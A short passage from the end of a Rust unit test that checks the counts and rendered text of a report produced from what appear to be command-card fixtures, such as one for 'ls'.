        assert_eq!((r.headings, r.commands, r.notes), (2, 1, 1));
        let s = r.render();
        assert!(s.contains("headings") && s.contains("entries") && s.contains("size"), "{}", s);
        let r = plan(LS_CARD, &opts()).report;
        assert_eq!((r.tools, r.profiles), (1, 1));
        assert!(r.render().contains("program profiles"), "{}", r.render());
    }
}
